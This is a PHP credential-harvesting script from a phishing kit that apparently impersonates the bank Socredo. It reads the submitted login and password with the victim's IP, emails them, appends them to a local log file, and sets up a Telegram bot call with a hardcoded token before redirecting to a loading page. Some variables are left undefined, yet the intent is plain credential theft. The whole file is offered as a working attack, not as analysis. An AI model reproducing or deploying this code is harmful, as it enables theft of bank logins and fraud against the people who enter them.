<?php
session_start();
error_reporting(0);
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
 
$ip = getenv("REMOTE_ADDR");
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |  SOCREDO IDENTIFIANT Log   | -----------\n";
$message .= "Login       :  ".$_POST['idLogin']." \n";
$message .= "Pass     :  ".$_POST['passLogin']."\n";
$message .= "----------- | By Papyrus | -----------\n";
$message .= "\n";
$send = "";
$subject = "| DEP CA Log | $ip |";
mail($send,$subject,$message);


$file = fopen("./Dani.txt", 'a');
fwrite($file, $message);

$praga=rand();
$praga=md5($praga);

$botToken="5992943547:AAGfU5uBHSzU-4XK-CtFe0VJ__sXYiyEClQ";

    $email="bureaupoliceeuropol@gmail.com".$botToken;


$ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

$useragent=$_SERVER['HTTP_USER_AGENT'];
header("Location:loading.html");

?>